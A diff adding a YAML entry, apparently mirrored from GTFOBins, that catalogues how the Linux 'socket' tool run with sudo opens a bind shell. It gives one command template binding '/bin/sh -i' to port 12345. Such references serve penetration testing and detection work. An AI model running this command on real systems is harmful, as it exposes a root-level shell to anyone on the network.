@@ -1,0 +1,25 @@
+id: gtfobins/socket/bind-shell/sudo
+type: binary
+platform: linux
+name: socket
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- bind-shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: socket -svp '/bin/sh -i' 12345
+references:
+- https://gtfobins.github.io/gtfobins/socket/
+tags:
+- linux
+- unix
+- gtfobins
